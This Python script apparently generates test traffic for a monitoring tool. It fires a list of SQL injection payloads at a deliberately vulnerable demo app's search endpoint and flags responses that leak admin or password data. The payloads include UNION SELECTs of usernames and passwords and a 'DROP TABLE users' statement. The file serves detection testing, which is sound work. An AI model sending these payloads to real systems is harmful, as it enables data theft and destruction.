"""SQL injection probe attack against the demo app.

Sends HTTP requests with SQL payloads in the search and login fields.
Generates real traffic the scanner pushes into SENTINEL.

Usage: python apps/vulnerable/attacks/sqli.py [--target http://demo-app:5000]
"""

from __future__ import annotations

import argparse
import time
from urllib import error, request

SQL_PAYLOADS = [
    "' OR 1=1 --",
    "' OR 'a'='a",
    "1; DROP TABLE users--",
    "admin'--",
    "' UNION SELECT * FROM users--",
    "1' AND 1=1--",
    "' OR ''='",
    "admin' OR '1'='1'--",
    "1' UNION SELECT username,password FROM users--",
]


def run(target: str, delay: float = 0.2, max_rounds: int = 3) -> int:
    target = target.rstrip("/")
    print(
        f"[sqli] attacking {target}/search with {len(SQL_PAYLOADS)} "
        f"payloads x{max_rounds} rounds"
    )
    for round_idx in range(max_rounds):
        for payload in SQL_PAYLOADS:
            encoded = payload.replace(" ", "+")
            url = f"{target}/search?q={encoded}"
            req = request.Request(url)
            try:
                resp = request.urlopen(req, timeout=5)
                code = resp.getcode()
                body = resp.read().decode(errors="replace")[:200]
            except error.HTTPError as e:
                code = e.code
                body = ""
            except Exception:
                code = 0
                body = ""
            leaked = "admin" in body or "password" in body or "SECRET" in body
            print(
                f"  round {round_idx+1}  payload={payload[:35]:35s}  "
                f"status={code}  leaked={leaked}"
            )
            time.sleep(delay)
    print(f"[sqli] done: {len(SQL_PAYLOADS) * max_rounds} probes sent")
    return 0


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--target", default="http://127.0.0.1:5000")
    parser.add_argument("--delay", type=float, default=0.2)
    parser.add_argument("--rounds", type=int, default=3)
    args = parser.parse_args()
    return run(args.target, delay=args.delay, max_rounds=args.rounds)


if __name__ == "__main__":
    raise SystemExit(main())
